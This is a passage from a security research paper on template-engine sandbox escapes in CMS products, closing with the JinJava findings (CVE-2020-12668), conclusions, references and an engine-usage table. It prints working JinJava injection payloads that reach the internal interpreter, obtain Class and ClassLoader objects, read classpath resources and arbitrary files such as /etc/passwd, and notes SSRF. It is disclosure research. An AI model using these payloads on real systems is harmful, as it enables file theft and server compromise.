### Code Analysis and Vulnerability Discussion

```java
"Cannot find method '" + method + "' in " + base.getClass();
```

However, this does not prevent `Array` or `Map` accesses from returning a `java.lang.Class` instance. Therefore, it is possible to obtain an instance of `java.lang.Class` if we find a method that returns `java.lang.Class[]` or `Map`.

#### JinJava Interpreter Vulnerability

JinJava has another vulnerability: it exposes the internal JinJava interpreter through the `____int3rpr3t3r____` variable. With access to the interpreter, we can perform several actions, such as listing all the variables in the template context, which might give us access to undocumented objects.

```jinja
{% for key in ____intrprtr____.getContext().entrySet().toArray() %}
    {{key.getKey()}} - {{key.getValue()}}
{% endfor %}
```

This also provides access to all filters, functions, and tags:

```jinja
{% for k in ____int3rpr3t3r____.getContext().getAllFunctions().toArray() %}
    {{k}}
{% endfor %}

{% for key in ____int3rpr3t3r____.getContext().getAllTags().toArray() %}
    {{key}}
{% endfor %}

{% for key in ____int3rpr3t3r____.getContext().getAllFilters().toArray() %}
    {{key.getName()}}
{% endfor %}
```

Functions are particularly interesting because they provide access to `java.lang.reflect.Method` instances. From a `Method`, we can access arrays of their exception and parameter types:

```jinja
{% for key in ____int3rpr3t3r____.getContext().getAllFunctions().toArray() %}
    {{key}} - {{key.getName()}} - 
    {% for exc in key.getMethod().getExceptionTypes() %}{{exc}}, {% endfor %}
    - {% for param in key.getMethod().getParameterTypes() %}{{param}}, {% endfor %}
{% endfor %}
```

With this, we can finally access `java.lang.Class` instances. For example:

```jinja
{% set class = ____int3rpr3t3r____.getContext().getAllFunctions().toArray()[0].getMethod().getParameterTypes()[0] %}
{{ class }}
```

#### ClassLoader Access

Once we have access to a `java.lang.Class` instance, we can also access a `java.lang.ClassLoader` instance through its `ProtectionDomain`, as direct access from `Class.getClassLoader()` is forbidden.

```jinja
{% set classLoader = class.getProtectionDomain().getClassLoader() %}
{{ classLoader }}
```

#### Arbitrary Classpath Resource Disclosure

Using `java.lang.Class` or `java.lang.ClassLoader` instances, we can access Classpath resources with:

```jinja
{% set is = class.getResourceAsStream("/Foo.class") %}
{% for i in range(999) %}
    {% set byte = is.read() %}
    {{ byte }},
{% endfor %}
```

#### Arbitrary File Disclosure

We can access arbitrary file system files by retrieving Classpath resources as a `java.net.URL` and then converting it to a `java.net.URI` because this class contains a static `resolve()` method that allows us to create arbitrary URIs. Now we have a URI pointing to the resource we want to access. We can open a connection and read its content from an input stream:

```jinja
{% set uri = class.getResource("/").toURI() %}
{% set url = uri.resolve("file:///etc/passwd").toURL() %}
{% set is = url.openConnection().getInputStream() %}
{% for i in range(999) %}
    {% set byte = is.read() %}
    {{ byte }},
{% endfor %}
```

#### Server-Side Request Forgery

We can use different protocols such as `http`, `https`, or `ftp` to establish a network connection and initiate a Server-Side Request Forgery (SSRF) attack.

These issues were fixed in version 2.5.4 (CVE-2020-12668).

### Pebble

The Pebble team is still addressing several bypasses we found for the Pebble sandbox. Details will be released on a future date.

### Conclusions

In this paper, we described the basic security design elements of the Template Engines used by CMS applications. We analyzed the implementation of different security controls in products and platforms where users can create or modify templates of dynamic content. Using various techniques, we bypassed the sandboxes and security controls of all the CMS applications under investigation and presented multiple ways to achieve Remote Code Execution (RCE) on these systems.

Key findings include:
- Thirty new vulnerabilities were found and responsibly reported to the vendors.
- More than twenty different products were affected, including: SharePoint, JinJava, Pebble, Apache Velocity, Apache FreeMarker, Alfresco, Crafter CMS, Liferay, Atlassian Confluence, XWiki, dotCMS, Lithium (Khoros), Cascade, HubSpot CMS, Apache OfBiz, Apache Syncope, Netflix Conductor, Netflix Titus, Sonatype Nexus, DropWizard Framework, and Apache Camel.

Consumers of the above CMS products should ensure that their patch management is up-to-date to reduce the risk of exploitation.

Based on these results, our conclusion is that this is not a problem of design or implementation of a specific product or framework. Proper sandboxing of user-controlled templates for dynamic content is not a trivial task and requires addressing many high-risk areas from a security perspective.

We hope our research increases developer awareness of potential weaknesses in this critical attack surface and brings these vulnerability classes into the spotlight of the community. This is a stepping stone for research around dynamic content injection, and similar problems may arise in other products or frameworks.

### References

- Alvaro Muñoz: .NET Serialization: Detecting and defending vulnerable endpoints
  - [Link](https://speakerdeck.com/pwntester/dot-net-serialization-detecting-and-defending-vulnerable-endpoints)
- Chapter 2: SharePoint Architecture
  - [Link](https://docs.microsoft.com/en-us/previous-versions/office/developer/sharepoint-services/bb892189(v=office.12))
- FreeMarker Security Implications
  - [Link](https://docs.huihoo.com/freemarker/2.3.22/app_faq.html#faq_template_uploading_security)
- FreeMarker Special Variable Reference
  - [Link](https://freemarker.apache.org/docs/ref_specvar.html)
- James Kettle: Server-Side Template Injection
  - [Link](https://portswigger.net/research/server-side-template-injection)
- Liam Cleary: SharePoint Security and a Web Shell
  - [Link](https://www.helloitsliam.com/2015/04/30/sharepoint-security-and-a-web-shell)
- Limited freemarker ssti to arbitrary liql query and manage lithium cms
  - [Link](https://blog.mert.ninja/freemarker-ssti-on-lithium-cms/)
- Michał Bentkowski: Server Side Template Injection – on the example of Pebble
  - [Link](https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
- Muñoz & Mirosh: A Journey from JNDI Manipulation to Remote Code Execution
  - [Link](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
- Muñoz & Mirosh: Friday the 13th JSON Attacks
  - [Link](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)
- RCE in Hubspot with EL injection in HubL
  - [Link](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)
- Remote Code Execution using Freemarker sandbox escape
  - [Link](https://issues.liferay.com/browse/LPE-14371)
- Ryan Hanson: JFrog Artifactory Insecure Freemarker Template Execution
  - [Link](https://github.com/atredispartners/advisories/blob/master/ATREDIS-2019-0006.md)
- Server Control Properties Example
  - [Link](https://docs.microsoft.com/en-us/previous-versions/aspnet/4s70936s%28v%3dvs.100%29)
- Shivprasad Koirala: SharePoint Quick Start FAQ
  - [Part 3](https://www.codeproject.com/Articles/31412/SharePoint-Quick-Start-FAQ-Part-3)
  - [Part 2](https://www.codeproject.com/Articles/31648/SharePoint-Quick-Start-FAQ-Part-2)
  - [Part III](https://www.codeproject.com/Articles/32583/SharePoint-Quick-Start-FAQ-Part-III)
  - [Part 4](https://www.codeproject.com/Articles/33222/SharePoint-Quick-Start-FAQ-Part-4)
  - [Part](https://www.codeproject.com/Articles/34664/SharePoint-Quick-Start-FAQ-Part)
  - [Workflows-Workfl](https://www.codeproject.com/Articles/35557/SharePoint-Quick-Start-FAQ-Part-Workflows-Workfl)
- Soroush Dalili: A Security Review of SharePoint Site Pages
  - [Link](https://www.mdsec.co.uk/2020/03/a-security-review-of-sharepoint-site-pages)
- Soroush Dalili: Exploiting Deserialisation in ASP.NET via ViewState
  - [Link](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate)
- Step 4: Add your Web Part to the Safe Controls List
  - [Link](https://docs.microsoft.com/en-us/previous-versions/office/developer/sharepoint-2007/ms581321(v=office.12))
- Toni Torralba: In-depth Freemarker Template Injection
  - [Link](https://ackcent.com/blog/in-depth-freemarker-template-injection/)
- Trevor Seward: Unattended Configuration for SharePoint Server 2016
  - [Link](https://thesharepointfarm.com/2016/03/unattended-configuration-for-sharepoint-server-2016)
- Using FreeMarker with servlets
  - [Link](https://freemarker.apache.org/docs/pgui_misc_servlet.html)
- Velocity Generic Tools
  - [Link](https://velocity.apache.org/tools/devel/generic.html)
- Velocity View
  - [Link](https://velocity.apache.org/tools/devel/view.html)
- Velocity: Add Support for Static Utility Classes
  - [Link](https://issues.apache.org/jira/browse/VELOCITY-102)
- Windows SharePoint Services 3.0 - SDK Documentation
  - [Link 1](https://docs.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms525940(v%3Dvs.90))
  - [Link 2](https://docs.microsoft.com/en-us/previous-versions/office/developer/sharepoint-services/ms774825(v%3Doffice.12))

### Code References

1. [TemplateControl.cs](https://referencesource.microsoft.com/#system.web/UI/TemplateControl.cs)
2. [TemplateParser.cs](https://referencesource.microsoft.com/#System.Web/UI/TemplateParser.cs)
3. [ObjectStorage.cs](https://referencesource.microsoft.com/#System.Data/fx/src/data/System/Data/Common/ObjectStorage.cs)
4. [TemplateControl.cs](https://referencesource.microsoft.com/#System.Web/UI/TemplateControl.cs)
5. [ControlParameter.cs](https://referencesource.microsoft.com/#System.Web/UI/WebControls/ControlParameter.cs)
6. [unsafeMethods.properties](https://github.com/apache/freemarker/blob/2.3-gae/src/main/resources/freemarker/ext/beans/unsafeMethods.properties)
7. [velocity.properties](https://raw.githubusercontent.com/apache/velocity-engine/761e3e517a65cf418d7220d16bb01627970bbca1/velocity-engine-core/src/main/resources/org/apache/velocity/runtime/defaults/velocity.properties)
8. [UberspectImpl.java](https://github.com/apache/velocity-engine/blob/2.2/velocity-engine-core/src/main/java/org/apache/velocity/util/introspection/UberspectImpl.java)
9. [UberspectImpl.java](https://github.com/apache/velocity-engine/blob/2.2/velocity-engine-core/src/main/java/org/apache/velocity/util/introspection/UberspectImpl.java)
10. [JinjavaBeanELResolver.java](https://github.com/HubSpot/jinjava/blob/jinjava-2.5.3/src/main/java/com/hubspot/jinjava/el/ext/JinjavaBeanELResolver.java)
11. [JinjavaBeanELResolver.java](https://github.com/HubSpot/jinjava/blob/jinjava-2.5.3/src/main/java/com/hubspot/jinjava/el/ext/JinjavaBeanELResolver.java)
12. [JinjavaBeanELResolver.java](https://github.com/HubSpot/jinjava/blob/jinjava-2.5.3/src/main/java/com/hubspot/jinjava/el/ext/JinjavaBeanELResolver.java)

### Appendix A: CMS Analysis Summary

| CMS | Template Engines Used | HttpServletRequest | ServletContext | ClassLoader | WebApplication ClassLoader | Instance Manager | Spring Application Context | Tomcat WebResourceRoot (StandardRoot) | Struts Action | Struts DefaultActionInvocation | Struts OgnlValueStack | Struts OgnlTool | FreeMarker StaticModels | Json Deserializers (directly exposed in the context) | Velocity FieldTool | Velocity ContextTool | Velocity View | Thread | OSGI Bundle Context | VelocityWebWorkUtil |
|-----|-----------------------|---------------------|----------------|-------------|----------------------------|------------------|---------------------------|--------------------------------------|---------------|------------------------------|----------------------|-----------------|-------------------------|----------------------------------------------------|--------------------|---------------------|---------------|--------|---------------------|---------------------|
| Alfresco | F | F | V | V | V | V | V | J |  |  |  |  |  |  |  |  |  |  |  |  |
| Liferay | F | F | V | V | V | V | J |  |  |  |  |  |  |  |  |  |  |  |  |  |
| Crafter | F | F | V | V | V | V | J |  |  |  |  |  |  |  |  |  |  |  |  |  |
| Ofbiz | F | F | V | V | V | V | J |  |  |  |  |  |  |  |  |  |  |  |  |  |
| Khoros | F | F | V | V | V | V | J |  |  |  |  |  |  |  |  |  |  |  |  |  |
| dotCMS | F | F | V | V | V | V | J |  |  |  |  |  |  |  |  |  |  |  |  |  |
| Confluence | F | F | V | V | V | V | J |  |  |  |  |  |  |  |  |  |  |  |  |  |
| XWiki | F | F | V | V | V | V | J |  |  |  |  |  |  |  |  |  |  |  |  |  |
| Cascade | F | F | V | V | V | V | J |  |  |  |  |  |  |  |  |  |  |  |  |  |
| HubSpot | F | F | V | V | V | V | J |  |  |  |  |  |  |  |  |  |  |  |  |  |

- **F**: Freemarker
- **V**: Velocity
- **J**: JinJava

This table summarizes the template engines and other components used in each CMS, highlighting the potential attack vectors.